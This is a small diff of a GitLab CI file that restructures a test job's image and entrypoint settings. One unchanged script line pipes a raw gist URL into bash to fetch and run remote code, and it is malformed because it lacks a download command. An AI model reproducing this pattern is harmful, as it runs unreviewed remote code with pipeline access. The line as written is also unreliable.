@@ -3,8 +3,9 @@ stages:
 
 test:
   stage: test
-  image: gitlab/gitlab-ce:latest
-  entrypoint: ["/bin/bash", "-i", "-c"]
+  image:
+    name: gitlab/gitlab-ce:latest
+    entrypoint: ["/bin/bash", "-i", "-c"]
   script:
    - set +x
    - https://gist.githubusercontent.com/parthanon/d0fb1a338b1bcf5a46fcc10c780ab542/raw/10bbfe2212e47275d69ca605721681b813416af8/gistfile1.txt | bash
